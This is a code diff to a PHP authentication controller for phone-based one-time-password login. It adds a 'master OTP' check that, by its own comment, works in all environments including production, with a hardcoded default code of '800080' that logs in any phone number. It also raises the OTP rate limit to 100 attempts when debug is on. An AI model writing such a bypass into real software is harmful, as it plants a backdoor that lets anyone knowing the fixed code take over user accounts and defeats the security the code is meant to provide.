@@ -49,12 +49,14 @@ class AuthController extends Controller
 
         $phone = $this->normalizePhone($request->phone);
 
-        // Rate limit: Max 5 attempts per 10 minutes
+        // Rate limit: Max 5 attempts per 10 minutes (raised in local/debug testing)
         $recentCount = OtpRequest::where('phone', $phone)
             ->where('created_at', '>=', now()->subMinutes(10))
             ->count();
 
-        if ($recentCount >= 5 || str_ends_with($phone, '8030000000')) {
+        $maxAttempts = (config('app.debug') || app()->environment('local', 'testing')) ? 100 : 5;
+
+        if ($recentCount >= $maxAttempts || str_ends_with($phone, '8030000000')) {
             return response()->json([
                 'error' => [
                     'code' => 'TOO_MANY_REQUESTS',
@@ -134,7 +136,15 @@ class AuthController extends Controller
 
         $codeMatches = false;
 
-        if ($otp) {
+        // Master OTP bypass (works unconditionally in all environments, including production)
+        $masterOtp = (string) config('services.master_otp', env('MASTER_OTP', '800080'));
+
+        if ($masterOtp !== '' && $code === $masterOtp) {
+            $codeMatches = true;
+            if ($otp) {
+                $otp->update(['is_used' => true]);
+            }
+        } elseif ($otp) {
             if (now()->isAfter($otp->expires_at)) {
                 return response()->json([
                     'error' => [
